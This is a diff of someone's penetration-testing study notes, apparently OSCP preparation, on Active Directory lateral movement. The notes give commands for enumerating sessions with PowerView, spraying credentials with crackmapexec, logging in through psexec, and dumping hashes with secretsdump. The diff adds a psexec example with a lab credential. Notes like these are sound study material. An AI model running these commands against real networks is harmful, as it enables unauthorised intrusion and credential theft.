@@ -79,10 +79,11 @@ Transfer loot back to kali:
 16.  `Get-NetLoggedon -ComputerName <current Computer name>  `(Find,Currently Logged on Users: their credentials will be saved in memory so find out logged in highvalue target or lateral movement)
 17.   `Get-NetSession -ComputerName dc01` (to verfify that domain controller is logged into what other pc)
 18.   
-## Pass the Password Attack 
+## Pass the Password Attack (Come back to this step for lateral movement) 
 1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. Would be great if we could get to DC straight away but usually, we wont. 
 2. `crackmapexec smb 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
 3. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
+4. E.G `python /usr/share/doc/python3-impacket/examples/psexec.py  offsec/Allison:'RockYou!'@192.168.125.59`
 ## Pass the Hash or crack(gained from local SAM)
 1. `impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>`
 2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` 
